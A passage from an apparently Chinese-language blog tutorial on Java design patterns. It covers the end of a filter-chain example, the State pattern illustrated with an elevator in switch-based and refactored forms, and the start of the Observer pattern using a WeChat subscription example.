chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器2 后置处理&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>模拟实现过滤器链FilterChain  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FilterChain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Filter&gt; filters = <span class="keyword">new</span> ArrayList&lt;Filter&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 链式调用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FilterChain <span class="title">addFilter</span><span class="params">(Filter filter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.filters.add(filter);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(Request request, Response response)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index == filters.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Filter filter = filters.get(index);</span><br><span class="line">        index++;</span><br><span class="line">        filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Request  req = <span class="keyword">null</span>;</span><br><span class="line">        Response res = <span class="keyword">null</span> ;</span><br><span class="line"></span><br><span class="line">        FilterChain filterChain = <span class="keyword">new</span> FilterChain();</span><br><span class="line">        filterChain.addFilter(<span class="keyword">new</span> FirstFilter()).addFilter(<span class="keyword">new</span> SecondFilter());</span><br><span class="line">        filterChain.doFilter(req,res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h4><p><strong>概述</strong></p>
<p>【例】通过按钮来控制一个电梯的状态，一个电梯有开门状态，关门状态，停止状态，运行状态。每一种状态改变，都有可能要根据其他状态来更新处理。例如，如果电梯门现在处于运行时状态，就不能进行开门操作，而如果电梯门是停止状态，就可以执行开门操作。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-22-14-41-19.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ILift</span> </span>&#123;</span><br><span class="line">    <span class="comment">//电梯的4个状态</span></span><br><span class="line">    <span class="comment">//开门状态</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> OPENING_STATE = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//关门状态</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> CLOSING_STATE = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">//运行状态</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> RUNNING_STATE = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">//停止状态</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> STOPPING_STATE = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置电梯的状态</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯的动作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Lift</span> <span class="keyword">implements</span> <span class="title">ILift</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> state;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">int</span> state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行关门动作</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>.state) &#123;</span><br><span class="line">            <span class="keyword">case</span> OPENING_STATE:</span><br><span class="line">                System.out.println(<span class="string">&quot;电梯关门了。。。&quot;</span>);<span class="comment">//只有开门状态可以关闭电梯门，可以对应电梯状态表来看</span></span><br><span class="line">                <span class="keyword">this</span>.setState(CLOSING_STATE);<span class="comment">//关门之后电梯就是关闭状态了</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CLOSING_STATE:</span><br><span class="line">                <span class="comment">//do nothing //已经是关门状态，不能关门</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RUNNING_STATE:</span><br><span class="line">                <span class="comment">//do nothing //运行时电梯门是关着的，不能关门</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STOPPING_STATE:</span><br><span class="line">                <span class="comment">//do nothing //停止时电梯也是关着的，不能关门</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行开门动作</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>.state) &#123;</span><br><span class="line">            <span class="keyword">case</span> OPENING_STATE:<span class="comment">//门已经开了，不能再开门了</span></span><br><span class="line">                <span class="comment">//do nothing</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CLOSING_STATE:<span class="comment">//关门状态，门打开:</span></span><br><span class="line">                System.out.println(<span class="string">&quot;电梯门打开了。。。&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setState(OPENING_STATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RUNNING_STATE:</span><br><span class="line">                <span class="comment">//do nothing 运行时电梯不能开门</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STOPPING_STATE:</span><br><span class="line">                System.out.println(<span class="string">&quot;电梯门开了。。。&quot;</span>);<span class="comment">//电梯停了，可以开门了</span></span><br><span class="line">                <span class="keyword">this</span>.setState(OPENING_STATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行运行动作</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>.state) &#123;</span><br><span class="line">            <span class="keyword">case</span> OPENING_STATE:<span class="comment">//电梯不能开着门就走</span></span><br><span class="line">                <span class="comment">//do nothing</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CLOSING_STATE:<span class="comment">//门关了，可以运行了</span></span><br><span class="line">                System.out.println(<span class="string">&quot;电梯开始运行了。。。&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setState(RUNNING_STATE);<span class="comment">//现在是运行状态</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RUNNING_STATE:</span><br><span class="line">                <span class="comment">//do nothing 已经是运行状态了</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STOPPING_STATE:</span><br><span class="line">                System.out.println(<span class="string">&quot;电梯开始运行了。。。&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setState(RUNNING_STATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行停止动作</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>.state) &#123;</span><br><span class="line">            <span class="keyword">case</span> OPENING_STATE: <span class="comment">//开门的电梯已经是是停止的了(正常情况下)</span></span><br><span class="line">                <span class="comment">//do nothing</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CLOSING_STATE:<span class="comment">//关门时才可以停止</span></span><br><span class="line">                System.out.println(<span class="string">&quot;电梯停止了。。。&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setState(STOPPING_STATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RUNNING_STATE:<span class="comment">//运行时当然可以停止了</span></span><br><span class="line">                System.out.println(<span class="string">&quot;电梯停止了。。。&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.setState(STOPPING_STATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STOPPING_STATE:</span><br><span class="line">                <span class="comment">//do nothing</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Lift lift = <span class="keyword">new</span> Lift();</span><br><span class="line">        lift.setState(ILift.STOPPING_STATE);<span class="comment">//电梯是停止的</span></span><br><span class="line">        lift.open();<span class="comment">//开门</span></span><br><span class="line">        lift.close();<span class="comment">//关门</span></span><br><span class="line">        lift.run();<span class="comment">//运行</span></span><br><span class="line">        lift.stop();<span class="comment">//停止</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题分析：</p>
<ul>
<li>使用了大量的switch…case这样的判断（if…else也是一样)，使程序的可阅读性变差。</li>
<li>扩展性很差。如果新加了断电的状态，我们需要修改上面判断逻辑</li>
</ul>
<p><strong>定义：</strong></p>
<p>对有状态的对象，把复杂的“判断逻辑”提取到不同的状态对象中，允许状态对象在其内部状态发生改变时改变其行为。</p>
<h5 id="结构-1"><a href="#结构-1" class="headerlink" title="结构"></a>结构</h5><p>状态模式包含以下主要角色。</p>
<ul>
<li>环境（Context）角色：也称为上下文，它定义了客户程序需要的接口，维护一个当前状态，并将与状态相关的操作委托给当前状态对象来处理。</li>
<li>抽象状态（State）角色：定义一个接口，用以封装环境对象中的特定状态所对应的行为。</li>
<li>具体状态（Concrete  State）角色：实现抽象状态所对应的行为。</li>
</ul>
<h5 id="案例实现-4"><a href="#案例实现-4" class="headerlink" title="案例实现"></a>案例实现</h5><p>对上述电梯的案例使用状态模式进行改进。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-22-14-42-55.png" style="zoom:70%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象状态类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">LiftState</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义一个环境角色，也就是封装状态的变化引起的功能变化</span></span><br><span class="line">    <span class="keyword">protected</span> Context context;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContext</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.context = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯开门动作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯关门动作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯运行动作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯停止动作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开启状态</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OpenningState</span> <span class="keyword">extends</span> <span class="title">LiftState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开启当然可以关闭了，我就想测试一下电梯门开关功能</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;电梯门开启...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//状态修改</span></span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.closeingState);</span><br><span class="line">        <span class="comment">//动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作</span></span><br><span class="line">        <span class="keyword">super</span>.context.getLiftState().close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯门不能开着就跑，这里什么也不做</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//do nothing</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开门状态已经是停止的了</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//do nothing</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行状态</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunningState</span> <span class="keyword">extends</span> <span class="title">LiftState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//运行的时候开电梯门？你疯了！电梯不会给你开的</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//do nothing</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯门关闭？这是肯定了</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;<span class="comment">//虽然可以关门，但这个动作不归我执行</span></span><br><span class="line">        <span class="comment">//do nothing</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这是在运行状态下要实现的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;电梯正在运行...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个事绝对是合理的，光运行不停止还有谁敢做这个电梯？！估计只有上帝了</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.stoppingState);</span><br><span class="line">        <span class="keyword">super</span>.context.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//停止状态</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StoppingState</span> <span class="keyword">extends</span> <span class="title">LiftState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//停止状态，开门，那是要的！</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//状态修改</span></span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.openningState);</span><br><span class="line">        <span class="comment">//动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作</span></span><br><span class="line">        <span class="keyword">super</span>.context.getLiftState().open();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;<span class="comment">//虽然可以关门，但这个动作不归我执行</span></span><br><span class="line">        <span class="comment">//状态修改</span></span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.closeingState);</span><br><span class="line">        <span class="comment">//动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作</span></span><br><span class="line">        <span class="keyword">super</span>.context.getLiftState().close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//停止状态再跑起来，正常的很</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//状态修改</span></span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.runningState);</span><br><span class="line">        <span class="comment">//动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作</span></span><br><span class="line">        <span class="keyword">super</span>.context.getLiftState().run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//停止状态是怎么发生的呢？当然是停止方法执行了</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;电梯停止了...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭状态</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClosingState</span> <span class="keyword">extends</span> <span class="title">LiftState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//电梯门关闭，这是关闭状态要实现的动作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;电梯门关闭...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯门关了再打开，逗你玩呢，那这个允许呀</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.openningState);</span><br><span class="line">        <span class="keyword">super</span>.context.open();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯门关了就跑，这是再正常不过了</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.runningState);</span><br><span class="line">        <span class="keyword">super</span>.context.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//电梯门关着，我就不按楼层</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.context.setLiftState(Context.stoppingState);</span><br><span class="line">        <span class="keyword">super</span>.context.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//环境角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Context</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义出所有的电梯状态</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> OpenningState openningState = <span class="keyword">new</span> OpenningState();<span class="comment">//开门状态，这时候电梯只能关闭</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> ClosingState closeingState = <span class="keyword">new</span> ClosingState();<span class="comment">//关闭状态，这时候电梯可以运行、停止和开门</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> RunningState runningState = <span class="keyword">new</span> RunningState();<span class="comment">//运行状态，这时候电梯只能停止</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> StoppingState stoppingState = <span class="keyword">new</span> StoppingState();<span class="comment">//停止状态，这时候电梯可以开门、运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个当前电梯状态</span></span><br><span class="line">    <span class="keyword">private</span> LiftState liftState;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LiftState <span class="title">getLiftState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.liftState;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLiftState</span><span class="params">(LiftState liftState)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//当前环境改变</span></span><br><span class="line">        <span class="keyword">this</span>.liftState = liftState;</span><br><span class="line">        <span class="comment">//把当前的环境通知到各个实现类中</span></span><br><span class="line">        <span class="keyword">this</span>.liftState.setContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.liftState.open();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.liftState.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.liftState.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.liftState.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> Context();</span><br><span class="line">        context.setLiftState(<span class="keyword">new</span> ClosingState());</span><br><span class="line"></span><br><span class="line">        context.open();</span><br><span class="line">        context.close();</span><br><span class="line">        context.run();</span><br><span class="line">        context.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>优缺点</strong></p>
<ul>
<li><p><strong>优点：</strong></p>
<ul>
<li><p>将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。</p>
</li>
<li><p>允许<strong>状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块</strong>。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p><strong>缺点：</strong></p>
<ul>
<li><p>状态模式的使用必然会增加系统类和对象的个数。 </p>
</li>
<li><p><strong>状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。</strong></p>
</li>
<li><p><strong>状态模式对”开闭原则”的支持并不太好。</strong></p>
</li>
</ul>
</li>
</ul>
<h5 id="使用场景-4"><a href="#使用场景-4" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li><strong>当一个对象的行为取决于它的状态，并且它必须在运行时根据状态改变它的行为时</strong>，就可以考虑使用状态模式。</li>
<li>一个操作中含有庞大的分支结构，并且这些分支决定于对象的状态时。</li>
</ul>
<h4 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h4><p><strong>定义：</strong></p>
<p>又被称为发布-订阅（Publish/Subscribe）模式，它定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态变化时，会通知所有的观察者对象，使他们能够自动更新自己。</p>
<p><strong>结构</strong></p>
<p>在观察者模式中有如下角色：</p>
<ul>
<li>Subject：抽象主题（抽象被观察者），抽象主题角色把所有观察者对象保存在一个集合里，每个主题都可以有任意数量的观察者，抽象主题提供一个接口，可以增加和删除观察者对象。</li>
<li>ConcreteSubject：具体主题（具体被观察者），该角色将有关状态存入具体观察者对象，在具体主题的内部状态发生改变时，给所有注册过的观察者发送通知。</li>
<li>Observer：抽象观察者，是观察者的抽象类，它定义了一个更新接口，使得在得到主题更改通知时更新自己。</li>
<li>ConcrereObserver：具体观察者，实现抽象观察者定义的更新接口，以便在得到主题更改通知时更新自身的状态。</li>
</ul>
<h5 id="案例实现-5"><a href="#案例实现-5" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】微信公众号</p>
<p>在使用微信公众号时，大家都会有这样的体验，当你关注的公众号中有新内容更新的话，它就会推送给关注公众号的微信用户端。我们使用观察者模式来模拟这样的场景，微信用户就是观察者，微信公众号是被观察者，有多个的微信用户关注了程序猿这个公众号。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-22-15-37-05.png" style="zoom:80%;" />

<p>代码如下：</p>
<p>定义抽象观察者类，里面定义一个更新的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(String message)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义具体观察者类，微信用户是观察者，里面实现了更新的方法</p>
